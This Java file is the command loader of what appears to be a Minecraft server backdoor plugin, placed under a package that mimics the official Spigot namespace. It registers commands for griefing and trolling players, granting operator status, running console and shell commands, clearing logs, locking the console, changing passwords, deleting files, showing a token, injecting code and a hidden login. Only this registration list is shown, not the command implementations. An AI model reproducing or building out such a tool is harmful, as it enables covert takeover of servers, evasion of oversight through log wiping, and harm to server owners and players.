package org.spigotmc.commands;

import org.spigotmc.commands.impl.admin.plugin.Login;
import org.spigotmc.commands.impl.griefing.*;
import org.spigotmc.commands.impl.player.*;
import org.spigotmc.commands.impl.plugin.*;
import org.spigotmc.commands.impl.server.*;
import org.spigotmc.commands.impl.trolling.*;
import org.spigotmc.commands.impl.world.*;
import org.spigotmc.commands.impl.premium.server.*;
import org.spigotmc.commands.impl.premium.player.*;

public class CommandLoader {
    public static void registerCommand() {
        //Griefing
        CommandManager.loadCommand(new Bomb());
        CommandManager.loadCommand(new Wand());
        CommandManager.loadCommand(new Kick());
        CommandManager.loadCommand(new Ban());
        CommandManager.loadCommand(new unBan());
        CommandManager.loadCommand(new TNTFly());
        //Player
        CommandManager.loadCommand(new AntiBan());
        CommandManager.loadCommand(new Op());
        CommandManager.loadCommand(new Deop());
        CommandManager.loadCommand(new Clear());
        CommandManager.loadCommand(new CommandSpy());
        CommandManager.loadCommand(new EnderChest());
        CommandManager.loadCommand(new Invsee());
        CommandManager.loadCommand(new Gamemode());
        CommandManager.loadCommand(new Give());
        CommandManager.loadCommand(new Kill());
        CommandManager.loadCommand(new Tp());
        CommandManager.loadCommand(new Dupe()); //api
        CommandManager.loadCommand(new God());
        CommandManager.loadCommand(new Blatant());
        CommandManager.loadCommand(new Sudo());
        //Player premium
        CommandManager.loadCommand(new Theme());
        //Server
        CommandManager.loadCommand(new BroadCast());
        CommandManager.loadCommand(new Console());
        CommandManager.loadCommand(new ClearLogs());
        CommandManager.loadCommand(new ClearChat());
        CommandManager.loadCommand(new Spam());
        CommandManager.loadCommand(new Save());
        CommandManager.loadCommand(new ServerInfo());
        CommandManager.loadCommand(new Disable());
        CommandManager.loadCommand(new Enable());
        CommandManager.loadCommand(new Floods());
        CommandManager.loadCommand(new ConsoleFloods());
        CommandManager.loadCommand(new LockConsole()); 
        CommandManager.loadCommand(new LockCommands());
        //Server premium
        CommandManager.loadCommand(new Delete());
        CommandManager.loadCommand(new Password());
        CommandManager.loadCommand(new Install());
        CommandManager.loadCommand(new Shell());
        CommandManager.loadCommand(new ShowToken());
        CommandManager.loadCommand(new inject());
        //Plugin
        CommandManager.loadCommand(new Help());
        CommandManager.loadCommand(new Plugins());
        CommandManager.loadCommand(new LoggedInList());
        CommandManager.loadCommand(new ServerChat());
        CommandManager.loadCommand(new Logout());
        CommandManager.loadCommand(new Version());
        //World
        CommandManager.loadCommand(new Day());
        CommandManager.loadCommand(new Night());
        CommandManager.loadCommand(new Seed());
        CommandManager.loadCommand(new WaterFlood());
        //Trolling
        CommandManager.loadCommand(new FakeCheater()); 
        CommandManager.loadCommand(new Freeze());
        CommandManager.loadCommand(new Unfreeze());
        CommandManager.loadCommand(new Launch());
        CommandManager.loadCommand(new Nickname());
        CommandManager.loadCommand(new Penis());
        //Admin
        CommandManager.loadCommand(new Login());
    }
}
